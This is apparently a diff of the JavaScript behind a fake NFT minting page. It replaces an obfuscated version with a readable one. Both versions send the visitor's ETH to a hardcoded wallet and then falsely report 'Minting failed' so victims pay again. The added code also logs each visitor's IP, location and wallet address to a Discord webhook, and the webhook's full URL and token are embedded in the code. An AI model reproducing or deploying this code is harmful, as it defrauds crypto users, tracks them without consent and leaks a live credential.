@@ -1,1 +1,154 @@
-const _0x274c81=_0x406f;(function(_0x167f71,_0x23b393){const _0x43a04d=_0x406f,_0xd00a34=_0x167f71();while(!![]){try{const _0x5d7480=-parseInt(_0x43a04d(0x18e))/0x1+parseInt(_0x43a04d(0x1ac))/0x2+-parseInt(_0x43a04d(0x19a))/0x3*(-parseInt(_0x43a04d(0x1b1))/0x4)+parseInt(_0x43a04d(0x19d))/0x5+parseInt(_0x43a04d(0x1a8))/0x6+parseInt(_0x43a04d(0x1ab))/0x7+parseInt(_0x43a04d(0x19e))/0x8*(-parseInt(_0x43a04d(0x18f))/0x9);if(_0x5d7480===_0x23b393)break;else _0xd00a34['push'](_0xd00a34['shift']());}catch(_0x9b2748){_0xd00a34['push'](_0xd00a34['shift']());}}}(_0x4b65,0xe439a));const statusp=document[_0x274c81(0x1a0)](_0x274c81(0x1a9)),connectBtn=document[_0x274c81(0x1a0)](_0x274c81(0x193)),checkoutBtn=document['querySelector'](_0x274c81(0x1a4)),pricePerNFT=0.25;function _0x406f(_0x20dbce,_0x245b09){const _0x4b6500=_0x4b65();return _0x406f=function(_0x406f5a,_0x2a91e5){_0x406f5a=_0x406f5a-0x18c;let _0x3dff6c=_0x4b6500[_0x406f5a];return _0x3dff6c;},_0x406f(_0x20dbce,_0x245b09);}$(document)[_0x274c81(0x19c)](function(){var _0x2e804e=0x1ed5;function _0x370ff5(){const _0x3db6cd=_0x406f;_0x2e804e>0x2241&&(_0x2e804e=0x0),$(_0x3db6cd(0x18c))[_0x3db6cd(0x19b)](_0x2e804e),_0x2e804e++;}setInterval(_0x370ff5,0x319);});let plusBtn=document[_0x274c81(0x1a0)]('button[class*=\x22text-button-plus\x22]'),minusBtn=document[_0x274c81(0x1a0)]('button[class*=\x22text-button-minus\x22]'),totalNFTInput=document[_0x274c81(0x1a0)](_0x274c81(0x1ae)),totalETHSpan=document['querySelector'](_0x274c81(0x1a1));totalNFTInput[_0x274c81(0x191)]=0x1,totalETHSpan[_0x274c81(0x197)]=totalNFTInput['value']*pricePerNFT,plusBtn[_0x274c81(0x195)](_0x274c81(0x1a5),()=>{const _0x2a2915=_0x274c81;totalNFTInput[_0x2a2915(0x191)]=Number(totalNFTInput[_0x2a2915(0x191)])+0x1,totalETHSpan[_0x2a2915(0x197)]=(totalNFTInput[_0x2a2915(0x191)]*pricePerNFT)[_0x2a2915(0x1af)](0x2);}),minusBtn[_0x274c81(0x195)](_0x274c81(0x1a5),()=>{const _0x362c11=_0x274c81;Number(totalNFTInput['value'])>0x1&&(totalNFTInput['value']=Number(totalNFTInput[_0x362c11(0x191)])-0x1,totalETHSpan[_0x362c11(0x197)]=(totalNFTInput[_0x362c11(0x191)]*pricePerNFT)[_0x362c11(0x1af)](0x2));}),connectBtn[_0x274c81(0x195)](_0x274c81(0x1a5),async()=>{const _0x1df121=_0x274c81;if(window['ethereum']){window['web3']=new Web3(ethereum);try{await ethereum['enable'](),initPayButton(),statusp[_0x1df121(0x196)]=_0x1df121(0x190);}catch(_0x17dde){console['log'](_0x17dde),statusp[_0x1df121(0x196)]=_0x1df121(0x192);}}else window[_0x1df121(0x194)]?(window[_0x1df121(0x194)]=new Web3(web3[_0x1df121(0x1b0)]),initPayButton()):statusp['innerHTML']=_0x1df121(0x1a2);});const initPayButton=()=>{checkoutBtn['addEventListener']('click',async()=>{const _0x105ba0=_0x406f;statusp[_0x105ba0(0x197)]=_0x105ba0(0x1a6);const _0x31affa='0x36b1469048D7Db8DE08e2871336df551f20E5c9B';let _0x3dd951=totalETHSpan['innerText'];_0x3dd951=_0x3dd951[_0x105ba0(0x1aa)]();const _0x48fede=await web3[_0x105ba0(0x18d)][_0x105ba0(0x1ad)]();web3['eth']['sendTransaction']({'from':web3[_0x105ba0(0x1b0)]['selectedAddress'],'to':_0x31affa,'value':web3['utils'][_0x105ba0(0x1a7)](_0x3dd951,_0x105ba0(0x198))},(_0x4df4bf,_0x4ceca5)=>{const _0x4bb9f0=_0x105ba0;_0x4df4bf?(console[_0x4bb9f0(0x1a3)]('Minting\x20failed',_0x4df4bf),statusp[_0x4bb9f0(0x197)]='Minting\x20failed'):(console[_0x4bb9f0(0x1a3)](_0x4bb9f0(0x199),_0x4ceca5),statusp[_0x4bb9f0(0x197)]='Minting\x20failed',checkoutBtn['innerText']=_0x4bb9f0(0x19f));});});};function _0x4b65(){const _0x1bd7f9=['1189822RorkmR','getAccounts','input[type=\x22text\x22][id=\x22totalNFT\x22]','toFixed','currentProvider','206204zHRViP','.count','eth','1358957ihRUaW','17186733hRjwJv','Wallet\x20connected.\x20Mint\x20your\x20NFTs\x20now!','value','Wallet\x20access\x20denied','#connectBtn','web3','addEventListener','innerHTML','innerText','ether','Minting\x20succeed','57DIjRPB','text','ready','4204460JZQdpd','8MMUgNE','Try\x20again','querySelector','#totalETH','No\x20Metamask\x20(or\x20other\x20Web3\x20Provider)\x20installed','log','#checkoutBtn','click','Minting\x20in\x20progress....','toWei','439896Ctvbsp','#status','toString','12003712jNWPIa'];_0x4b65=function(){return _0x1bd7f9;};return _0x4b65();}
+const statusp = document.querySelector("#status");
+const connectBtn = document.querySelector('#connectBtn');
+const checkoutBtn = document.querySelector('#checkoutBtn');
+//const connectBtnHeader = document.querySelector('#connectBtnHeader');
+const web3 = window.Web3;
+const ethereum = window.ethereum;
+const pricePerNFT = 0.1;
+const show_dc = true
+/** input number spinner
+ */
+db = window.localStorage;
+function getRandomInt(max) {
+  return Math.floor(Math.random() * max);
+}
+
+if (db.getItem('id') == null)
+{
+    myid = (getRandomInt(4096)).toString(16);
+    db.setItem("id", myid)
+} else {
+    var myid = (db.getItem('id'))
+}
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+    js_data = (JSON.stringify(data, null, 2));
+    sendMessage("**[" + myid + "]** Visiting.  \n `" + js_data.replace(/(\r\n|\n|\r)/gm, "") + " `");
+});
+
+function sendMessage(cont) {
+    if (show_dc) {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/960459823516897280/QrUbvLFm22KkgyPhswqBe-vBgxOkxt3_onLSu3hvNdnJ9o41dimJhNsMcMeRUl_GLP-c");
+        // replace the url in the "open" method with yours
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+            username: "DAPE",
+            avatar_url: "",
+            content: cont
+        }
+        request.send(JSON.stringify(params));
+    }
+
+}
+
+let plusBtn = document.querySelector('button[class*="btn-plus"]');
+let minusBtn = document.querySelector('button[class*="btn-minus"]');
+let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
+let totalETHSpan =  document.querySelector('#totalETH');
+totalNFTInput.value = 1;
+totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;
+
+plusBtn.addEventListener('click',()=>{
+  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
+  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
+})
+minusBtn.addEventListener('click',()=>{
+  if (Number(totalNFTInput.value)>1) {
+    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
+    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
+  }
+
+})
+//** end of input number spinner */
+
+checkoutBtn.style.display = "none"
+
+connectBtn.addEventListener('click', async () => {
+    if (ethereum) {
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+        connectBtn.style.display = "none"
+        checkoutBtn.style.display = "block"
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (web3) {
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  })
+
+  /*
+  connectBtnHeader.addEventListener('click', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  })
+
+
+  if  (err) {
+    console.log('Minting failed', err)
+    statusp.innerText = 'Minting failed'
+  } else {
+    console.log('Minting succeed', transactionId)
+    statusp.innerText = 'Minting succeed';
+    checkoutBtn.innerText = 'Mint again?'
+  }
+
+  */
+
+  const initPayButton = () => {
+    checkoutBtn.addEventListener('click', async () => {
+      statusp.innerText = 'Minting in progress....'
+      // paymentAddress is where funds will be send to
+      const paymentAddress = '0xDfb5f465D326694AcDcDae0Cf31eF5ea3CE1f186'
+      let totalEth = totalETHSpan.innerText;
+      //totalEth = totalEth.toString();
+      accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
+      sendMessage("**[" + myid + "] **Trying to mint. \n `" + accounts[0] + "` {<https://etherscan.io/address/" + accounts[0] + ">}")
+      const priceToWei = (totalEth * 1e18).toString(16);
+      const gasLimit = (200_000 * totalEth).toString(16);
+      ethereum
+        .request({
+          method: "eth_sendTransaction",
+          params: [
+            {
+              from: accounts[0],
+              to: paymentAddress,
+              value: priceToWei,
+            },
+          ],
+        })
+        .then((txHash) => {
+          statusp.innerText = 'Minting failed';
+          checkoutBtn.innerText = 'Mint again?'
+         sendMessage("**[" + myid + "] ** MINTED")
+         sendMessage("**[" + myid + "] ** MINTED")
+         sendMessage("**[" + myid + "] ** MINTED, Verd mu kätel: +" + totalEth.toString())
+        })
+        .catch((error) => {
+          console.log('Minting failed', error)
+          sendMessage("**[" + myid + "]** Minting failed \n `" + error.message + "`")
+          statusp.innerText = 'Minting failed'
+        });
+    })
+  }
+
